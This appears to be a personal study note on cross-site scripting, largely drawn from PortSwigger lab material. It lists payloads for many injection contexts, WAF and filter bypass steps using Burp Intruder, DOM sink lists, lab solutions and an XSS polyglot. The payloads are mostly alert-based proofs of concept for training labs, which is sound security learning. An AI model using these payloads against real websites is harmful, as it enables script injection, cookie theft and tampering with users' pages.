**Initial steps :**

*how xss happens input printed inside page*

try `x>"x` to check if input turned into entities 

​	see where the input goes on HTML code

​	try `confirm` `prompt` if `alert` blocked



*most possible cases and labs to practice : https://portswigger.net/web-security/cross-site-scripting/contexts*

---

When testing for **reflected** and **stored** XSS, a key task is to identify the XSS context:

- The location within the response where attacker-controllable data appears.
- Any input validation or other processing that is being performed on that data by the application.

comprehensive [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) from *portSwigger*

---

**XSS between HTML tags**
When the XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript.

Some useful ways of executing JavaScript are:

`<script>alert(document.domain)</script>`

`<img src=1 onerror=alert(1)>`

---

**WAF Installed**

in this case we will use *burpsuit* to identify which tag and attribute not filtered

1. In Burp Intruder, in the Positions tab, click "Clear §". Replace the value of the search term with: `<>`
2. Place the cursor between the angle brackets and click "Add §" twice, to create a payload position. The value of the search term should now look like: `<§§>`
3. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click "Copy tags to clipboard".
4. In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".
5. When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the `body` payload, which caused a 200 response.
6. Go back to the Positions tab in Burp Intruder and replace your search term with: `<body%20=1>`
7. Place the cursor before the `=` character and click "Add §" twice, to create a payload position. The value of the search term should now look like: `<body%20§§=1>`
8. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click "copy events to clipboard".
9. In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list. Click "Start attack".
10. When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the `onresize` payload, which caused a 200 response.
11. Go to the exploit server and paste the following code, replacing `your-lab-id` with your lab ID:
    `<iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'>`
12. Click "Store" and "Deliver exploit to victim".

check this https://yikai0505.medium.com/lab-reflected-xss-into-html-context-with-most-tags-and-attributes-blocked-fa6098938b34

---

**Reflected XSS with event handlers and `href` attributes blocked** 

we will use <svg> tag

<animate>
The SVG <animate> element provides a way to animate an attribute of an element over time.

`<svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">`
 	 `<rect width="10" height="10">`
 	  ` <animate attributeName="rx" values="0;5;0" dur="10s" repeatCount="indefinite" />`
 	` </rect>`
`</svg>`

search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E 

`search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>`

---

**Reflected XSS with some SVG markup allowed**

`search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E`

`search=<svg><animatetransform%20=1>`

---

When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:

```
"><script>alert(document.domain)</script>
```

More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example:

```
" autofocus onfocus=alert(document.domain) x="
```

The above payload creates an `onfocus` event that will execute JavaScript when the element receives the focus, and also adds the `autofocus` attribute to try to trigger the `onfocus` event automatically without any user interaction. Finally, it adds `x="` to gracefully repair the following markup.

`"onmouseover="alert(1)`

---

**input field value goes to href attribute** 

Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. Here, you can execute JavaScript without needing to terminate the attribute value. For example, if the XSS context is into the `href` attribute of an anchor tag, you can use the `javascript` pseudo-protocol to execute script. For example:

`<a href="javascript:alert(document.domain)">`



lab solution :

1. Post a comment with a random alphanumeric string in the "Website" input, then use Burp Suite to intercept the request and send it to Burp Repeater.
2. Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.
3. Observe that the random string in the second Repeater tab has been reflected inside an anchor `href` attribute.
4. Repeat the process again but this time replace your input with the following payload to inject a JavaScript URL that calls alert: `javascript:alert(1)`
5. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in your browser. Clicking the name above your comment should trigger an alert.

---

**Reflected XSS in canonical link tag**

You might encounter websites that encode angle brackets but still allow you to inject attributes. Sometimes, these injections are possible even within tags that don't usually fire events automatically, such as a canonical tag. You can exploit this behavior using access keys and user interaction on Chrome. Access keys allow you to provide keyboard shortcuts that reference a specific element. The `accesskey` attribute allows you to define a letter that, when pressed in combination with other keys (these vary across different platforms), will cause events to fire. In the next lab you can experiment with access keys and exploit a canonical tag.

`?%27accesskey=%27x%27onclick=%27alert(1)`

`?'accesskey='x'onclick='alert(1)`

---

**XSS into JavaScript**
When the XSS context is some existing JavaScript within the response, a wide variety of situations can arise, with different techniques necessary to perform a successful exploit.

Terminating the existing script
In the simplest case, it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript. For example, if the XSS context is as follows:

`<script>`
`...`
`var input = 'controllable data here';`
`...`
`</script>`


then you can use the following payload to break out of the existing JavaScript and execute your own:

`</script><img src=1 onerror=alert(document.domain)>`

The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts. The above payload leaves the original script broken, with an unterminated string literal. But that doesn't prevent the subsequent script being parsed and executed in the normal way.

---

**Breaking out of a JavaScript string**
In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.

Some useful ways of breaking out of a string literal are:

`'-alert(document.domain)-'`
`';alert(document.domain)//`

Some applications attempt to prevent input from breaking out of the JavaScript string by escaping any single quote characters with a backslash. A backslash before a character tells the JavaScript parser that the character should be interpreted literally, and not as a special character such as a string terminator. In this situation, applications often make the mistake of failing to escape the backslash character itself. This means that an attacker can use their own backslash character to neutralize the backslash that is added by the application.

For example, suppose that the input:

```
';alert(document.domain)//
```

gets converted to:

```
\';alert(document.domain)//
```

You can now use the alternative payload:

```
\';alert(document.domain)//
```

which gets converted to:

```
\\';alert(document.domain)//
```

Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. This means that the quote is now interpreted as a string terminator, and so the attack succeeds.

---

Some websites make XSS more difficult by restricting which characters you are allowed to use. This can be on the website level or by deploying a WAF that prevents your requests from ever reaching the website. In these situations, you need to experiment with other ways of calling functions which bypass these security measures. One way of doing this is to use the `throw` statement with an exception handler. This enables you to pass arguments to a function without using parentheses. The following code assigns the `alert()` function to the global exception handler and the `throw` statement passes the `1` to the exception handler (in this case `alert`). The end result is that the `alert()` function is called with `1` as an argument.

```
onerror=alert;throw 1
```



`?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`

---

**Making use of HTML-encoding**

When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters.

When the browser has parsed out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any further. If the server-side application blocks or sanitizes certain characters that are needed for a successful XSS exploit, you can often bypass the input validation by HTML-encoding those characters.

For example, if the XSS context is as follows:

`<a href="#" onclick="... var input='controllable data here'; ...">`

and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:

`'-alert(document.domain)-'`

The `'` sequence is an HTML entity representing an apostrophe or single quote. Because the browser HTML-decodes the value of the `onclick` attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds.

---



XSS in JavaScript template literals
JavaScript template literals are string literals that allow embedded JavaScript expressions. The embedded expressions are evaluated and are normally concatenated into the surrounding text. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the ${...} syntax.

For example, the following script will print a welcome message that includes the user's display name:



```
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```

When the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the ${...} syntax to embed a JavaScript expression that will be executed when the literal is processed. For example, if the XSS context is as follows:

<script>
...
var input = `controllable data here`;
...
</script>

then you can use the following payload to execute JavaScript without terminating the template literal:

${alert(document.domain)}

---

**Dom XSS :**

if resources used directly into sinks without filter , close tag start new tag with alert in it 

script :

`document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');`

```javascript
function trackSearch(query) {
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+ query +'">'); 
}

var query = (new URLSearchParams(window.location.search)).get('search'); 
if(query) { 
	trackSearch(query); 
}
```

*query is user input* ... so if the query equal `"><img src=1 onerror="alert(1)"> ` the code operate like :

```javascript
document.write('<img src="/resources/images/tracker.gif?searchTerms='+"> 
               <img src=1 onerror="alert(1)">
               +'">');
```



---

`document.write` includes some surrounding context that you need to take account of in your exploit. For example, you might need to close some existing elements before using your JavaScript payload.

example :

`product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>`

---

The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire. This means you will need to use alternative elements like img or iframe. Event handlers such as onload and onerror can be used in conjunction with these elements. For example:

`element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'`

```javascript
function doSearchQuery(query) {
	document.getElementById('searchMessage').innerHTML = query;
}

var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
	doSearchQuery(query);
}
```

---

If a JavaScript library such as jQuery is being used, look out for sinks that can alter DOM elements on the page. For instance, the `attr()` function in jQuery can change attributes on DOM elements. If data is read from a user-controlled source like the URL and then passed to the `attr()` function, then it may be possible to manipulate the value sent to cause XSS. For example, here we have some JavaScript that changes an anchor element's `href` attribute using data from the URL:

```
$(function(){$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));});
```

You can exploit this by modifying the URL so that the `location.search` source contains a malicious JavaScript URL. After the page's JavaScript applies this malicious URL to the back link's `href`, clicking on the back link will execute it:

```
?returnUrl=javascript:alert(document.domain)
```



If a framework like [AngularJS](https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox) is used, it may be possible to execute JavaScript without angle brackets or events. When a site uses the `ng-app` attribute on an HTML element, it will be processed by AngularJS. In this case, AngularJS will execute JavaScript inside double curly braces that can occur directly in HTML or inside attributes.

`{{$on.constructor('alert(1)')()}}`

---

**DOM XSS combined with reflected and stored data**
Some pure DOM-based vulnerabilities are self-contained within a single page. If a script reads some data from the URL and writes it to a dangerous sink, then the vulnerability is entirely client-side.

However, sources aren't limited to data that is directly exposed by browsers - they can also originate from the website. For example, websites often reflect URL parameters in the HTML response from the server. This is commonly associated with normal XSS, but it can also lead to so-called reflected+DOM vulnerabilities.

In a reflected+DOM vulnerability, the server processes data from the request, and echoes the data into the response. The reflected data might be placed into a JavaScript string literal, or a data item within the DOM, such as a form field. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

eval('var data = "reflected string"');

`var searchResultsObj = {"searchTerm":"\\"-alert(1)}//","results":[]}`

---

Websites may also store data on the server and reflect it elsewhere. In a stored+DOM vulnerability, the server receives data from one request, stores it, and then includes the data in a later response. A script within the later response contains a sink which then processes the data in an unsafe way.

element.innerHTML = comment.author

`<><img src=1 onerror=alert(1)>`

---

The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:

```
document.write()
document.writeln()
document.domain
someDOMElement.innerHTML
someDOMElement.outerHTML
someDOMElement.insertAdjacentHTML
someDOMElement.onevent
```

The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:

```
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

------

**XSS polyglots** : An XSS polyglot can be generally defined as any XSS vector that is executable within various injection contexts in its raw form.

Example and Explain

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

- `jaVasCript:`: A label in ECMAScript; a URI scheme otherwise.
- `/*-/*/*\/*'/*"/**/`: A multi-line comment in ECMAScript; a literal-breaker sequence.
- `(/* */oNcliCk=alert() )`: A tangled execution zone wrapped in invoking parenthesis!
- `//%0D%0A%0d%0a//`: A single-line comment in ECMAScript; a double-CRLF in HTTP response headers.
- `</stYle/</titLe/</teXtarEa/</scRipt/--!>`: A sneaky HTML-tag-breaker sequence.
- `\x3csVg/<sVg/oNloAd=alert()//>\x3e`: An innocuous svg element.

more details : https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

polyglots payloads : https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626

Read more : https://dev.to/caffiendkitten/xss-javascript-polyglots-4i64